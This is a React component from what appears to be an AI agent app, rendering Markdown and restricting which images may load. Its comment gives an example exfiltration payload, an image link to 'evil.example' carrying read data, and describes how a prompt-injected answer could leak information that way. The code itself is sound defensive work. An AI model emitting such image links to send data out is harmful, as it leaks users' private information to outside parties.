import { API_ROUTES } from '@open-agent/shared';
import { code } from '@streamdown/code';
import { defaultRehypePlugins, Streamdown, type StreamdownProps } from 'streamdown';

type Pluggable = NonNullable<StreamdownProps['rehypePlugins']>[number];
type PluginTuple = Extract<Pluggable, readonly unknown[]>;

const plugins = { code };

/**
 * An image loads with no click: one from anywhere would let a prompt-injected answer send what it read to another
 * site (`![](https://evil.example/?d=…)`). Only the user's own files show; links stay open, they need a click.
 */
const rehypePlugins = Object.entries(defaultRehypePlugins).map(([name, plugin]): Pluggable => {
  if (name !== 'harden') return plugin;
  const [harden] = plugin as PluginTuple;
  return [
    harden,
    {
      defaultOrigin: window.location.origin,
      allowedImagePrefixes: [`${API_ROUTES.files}/`],
      allowDataImages: false,
      allowedLinkPrefixes: ['*'],
      allowedProtocols: ['*'],
    },
  ];
});

/** Its own chunk (Markdown parsing and code highlighting are heavy): the app shell loads without it. */
export default function Markdown({ text, streaming }: { text: string; streaming: boolean }) {
  return (
    <Streamdown
      plugins={plugins}
      rehypePlugins={rehypePlugins}
      isAnimating={streaming}
      className='text-[15px] leading-relaxed [&_h1]:text-xl [&_h2]:text-lg [&_h3]:text-base [&_h4]:text-base'
    >
      {text}
    </Streamdown>
  );
}
